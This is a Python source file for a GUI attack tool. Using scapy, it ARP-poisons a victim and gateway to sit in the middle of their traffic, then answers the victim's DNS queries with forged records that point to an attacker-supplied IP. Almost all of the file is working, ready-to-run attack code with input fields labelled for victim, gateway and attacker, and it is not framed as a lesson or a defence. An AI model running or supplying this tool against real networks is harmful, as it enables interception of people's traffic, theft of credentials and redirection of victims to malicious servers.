# MITM + DNSSpoofer

from scapy.all import *
import sys
import os
import time

# ----- MITM -----

def get_mac(IP):
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP)
    ans, unans = srp(request, timeout=2, retry=1)
    for sent, recv in ans:
        return recv.hwsrc

def reARP(mitm_out, victim_ip, gateway_ip):
    mitm_out.print("\n[*] Restoring targets...")
    victimMAC = get_mac(victim_ip)
    gateMAC = get_mac(gateway_ip)
    send(ARP(op = 2, pdst = gateway_ip, psrc = victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 7)
    send(ARP(op = 2, pdst = victim_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= gateMAC), count = 7) 
    mitm_out.print("\n[*] Shutting Down...")

def spoofer(gm, vm, victim_ip, gateway_ip):
    send(ARP(op = 2, pdst = victim_ip, psrc = gateway_ip, hwdst = vm))
    send(ARP(op = 2, pdst = gateway_ip, psrc = victim_ip, hwdst = gm))

# ----------------

# ----- DNSSpoofer -----

from os import uname
from subprocess import call
from sys import argv, exit
from time import ctime, sleep

def dnsSpoofer(dns_out, interfaceValue, attacker_ip):
    getDNSPacket = sniff(iface=interfaceValue, filter="dst port 53", count=1)

    if (getDNSPacket[0].haslayer(DNS)) and (getDNSPacket[0].getlayer(DNS).qr == 0) and (getDNSPacket[0].getlayer(DNS).qd.qtype == 1) and (getDNSPacket[0].getlayer(DNS).qd.qclass == 1):
        dns_out.print('\n Got Query on %s ' %ctime())

    clientSrcIP = getDNSPacket[0].getlayer(IP).src

    if getDNSPacket[0].haslayer(UDP):
        clientSrcPort = getDNSPacket[0].getlayer(UDP).sport
    elif getDNSPacket[0].haslayer(TCP):
        clientSrcPort = getDNSPacket[0].getlayer(TCP).sport
    else:
        pass

    clientDNSQueryID = getDNSPacket[0].getlayer(DNS).id

    clientDNSQueryDataCount = getDNSPacket[0].getlayer(DNS).qdcount

    clientDNSServer = getDNSPacket[0].getlayer(IP).dst

    clientDNSQuery = getDNSPacket[0].getlayer(DNS).qd.name

    dns_out.print('Received Source IP: %s \n Recieved Source Port: %d \n Recieved Query ID: %d \n Query Data Count: %d \n Current DNS Server: %s \n DNS Query: %s ' %(clientSrcIP, clientSrcPort, clientDNSQueryID, clientDNSQueryDataCount, clientDNSServer, clientDNSQuery))

    spoofedDNSServerIP = attacker_ip.strip()

    spooftedIPPacket = IP(src=spoofedDNSServerIP, dst=clientSrcIP)

    if getDNSPacket[0].haslayer(UDP):
        spoofedUDP_TCPPacket = UDP(sport = 53, dport=clientSrcPort)
    elif getDNSPacket[0].haslayer(TCP):
        spoofedUDP_TCPPacket = UDP(sport = 53, dport=clientSrcPort)

    spoofedDNSPacket = DNS(id=clientDNSQueryID, qr=1, opcode=getDNSPacket[0].getlayer(DNS).opcode, aa=1, rd=0, ra=0, z=0, rcode=0, qdcount=clientDNSQueryDataCount, ancount=1, nscount=1, arcount=1, qd=DNSQR(qname = clientDNSQuery, qtype=getDNSPacket[0].getlayer(DNS).qd.qtype, qclass=getDNSPacket[0].getlayer(DNS).qd.qclass), an=DNSRR(rrname=clientDNSQuery, rdata=spoofedDNSServerIP, ttl=86400), ns=DNSRR(rrname=clientDNSQuery, type=2, ttl=86400, rdata=spoofedDNSServerIP), ar=DNSRR(rrname=clientDNSQuery, rdata=spoofedDNSServerIP))

    dns_out.print(' \n Sending spoofed response packet ')
    sendp(Ether()/spooftedIPPacket/spoofedUDP_TCPPacket/spoofedDNSPacket,iface=interfaceValue.strip(), count=1)
    dns_out.print(' Spoofed DNS Server: %s \n Source port: %d \n Destination port: %d ' %(spoofedDNSServerIP, 53, clientSrcPort))

# ----------------------

# DNS & MITM Combined

def mitm_dns_attack(window, mitm_out, victim_ip, gateway_ip, dns = False, dns_out = None, interface = None, attacker_ip = None):
    repeat = True

    try:
        victim_mac = get_mac(victim_ip)
    except Exception:
        mitm_out.print("\n[!] Couldn't find Victim's MAC Address! Exiting...")
        repeat = False

    try:
        gateway_mac = get_mac(gateway_ip)
    except Exception:
        mitm_out.print("\n[!] Couldn't find Gateway's MAC Address! Exiting...")
        repeat = False

    while repeat:
        try:
            spoofer(gateway_mac, victim_mac, victim_ip, gateway_ip)

            if dns == True:
                dnsSpoofer(dns_out, interface, attacker_ip)
            
            time.sleep(1.5)

            window.refresh()

        except KeyboardInterrupt:
            mitm_out.print("\n[*] User Requested Shutdown. Exiting...")

            if dns == True:
                dns_out.print("\n[*] User Requested Shutdown. Exiting...")

            reARP(mitm_out, victim_ip, gateway_ip)

            repeat = False
        
        except Exception as e:
            mitm_out.print("\n[!] Something went wrong! Exiting...")

            if dns == True:
                dns_out.print("\n[!] Something went wrong! Exiting...")

            reARP(mitm_out, victim_ip, gateway_ip)

            repeat = False

# ----------


# ====================
# GUI code starts here
# ====================

import PySimpleGUI as sg

sg.LOOK_AND_FEEL_TABLE['DarkMode'] = {  'BACKGROUND': '#121212',
                                        'TEXT': '#E0E0E0',
                                        'INPUT': '#1C1C1E',
                                        'TEXT_INPUT': '#FFFFFF',
                                        'SCROLL': '#32D74B',
                                        'BUTTON': ('#E0E0E0', '#32D74B'),
                                        'PROGRESS': ('#32D74B', '#333333'),
                                        'BORDER': 0,
                                        'SLIDER_DEPTH': 0,
                                        'PROGRESS_DEPTH': 0
                                    }

sg.theme('DarkMode')
sg.SetOptions(element_padding=(8,8))

def MAKE_Spoofer():
    interfaces = get_if_list()

    font_size = 'Any 20'

    col =  [[sg.Text("MITM", font=(font_size + ' underline'), text_color='#E0E0E0')],
            [sg.Text("Victim's IP: ", font=font_size, text_color='#E0E0E0'), sg.Input(font=font_size, text_color='#E0E0E0', key='-V_IP-', size=(15,1))],
            [sg.Text("Gateway's IP: ", font=font_size, text_color='#E0E0E0'), sg.Input(font=font_size, text_color='#E0E0E0', key='-G_IP-', size=(15,1))],
            [sg.Button('Start', font=font_size, key="-START-", bind_return_key=True),
                sg.Button('Close', font=font_size, button_color=('#E0E0E0','#9F9FA5'))],
            [sg.Multiline("", write_only=True, autoscroll=True, size=(55, 25), text_color='#E0E0E0', font='Any 12', key="-MITMOUT-"+sg.WRITE_ONLY_KEY)]
            ]

    col2 = [[sg.Text("DNSSpoofer", font=(font_size + ' underline'), text_color='#E0E0E0')],
            [sg.Text("Enable: ", font=font_size, text_color='#E0E0E0'), sg.Button('ON', font='Any 16', key="-DNSENABLED-", enable_events=True)],
            [sg.pin(
                sg.Column( [[sg.Text("Interface: ", font=font_size, text_color='#E0E0E0'),
                                sg.Combo(interfaces, default_value=interfaces[0], font=font_size, enable_events=True, key="-IF-", readonly=True)],
                            [sg.Text("Attacker's IP: ", font=font_size, text_color='#E0E0E0'), sg.Input(font=font_size, text_color='#E0E0E0', key='-A_IP-', size=(15,1))],
                            [sg.Multiline("", write_only=True, autoscroll=True, size=(55, 25), text_color='#E0E0E0', font='Any 12', key="-DNSOUT-"+sg.WRITE_ONLY_KEY)]
                            ], key='-DNSCOL-', visible=True)
            )]
    ]

    layout = [[sg.Column(col, size=(600, 720)), sg.Column(col2, size=(600, 720))]]

    return sg.Window('Spoofer', layout, size=(1280,720), finalize=True)

def CHECK_Spoofer(window, event, values):

    if event == sg.WIN_CLOSED or event == 'Close':
        window.close()
    
    elif event.startswith('-DNSENABLED-'):
        if window[event].GetText() == 'ON':
            window[event].update("OFF")
            window[event].update(button_color=('black', 'red'))
            window['-DNSCOL-'].update(visible=False)
        else:
            window[event].update("ON")
            window[event].update(button_color=('#E0E0E0', '#32D74B'))
            window['-DNSCOL-'].update(visible=True)
    
    elif event.startswith('-START-'):
        victim_ip = values['-V_IP-']
        gateway_ip = values['-G_IP-']
        interface = values['-IF-']
        attacker_ip = values['-A_IP-']
        mitm_out = window['-MITMOUT-'+sg.WRITE_ONLY_KEY]
        dns_out = window['-DNSOUT-'+sg.WRITE_ONLY_KEY]
        enable_dns = False

        mitm_out.update("")
        dns_out.update("")

        if window['-DNSENABLED-'].GetText() == 'ON':
            dns_out.print("[*] Sniffing for DNS Packets...")
            enable_dns = True

        mitm_out.print("[*] ARP Spoofing targets...")
        window.refresh()
        mitm_dns_attack(window, mitm_out, victim_ip, gateway_ip, enable_dns, dns_out, interface, attacker_ip)

        # DEBUG
        # print("Victim's IP:", victim_ip)
        # print("Gateway's IP:", gateway_ip)
        # print("Interface:", interface)
        # print("Attacker's IP:", attacker_ip)

    return True

if __name__ == "__main__":
    window = MAKE_Spoofer()

    while True:
        event, values = window.read()
        
        if not (CHECK_Spoofer(window, event, values)):
            break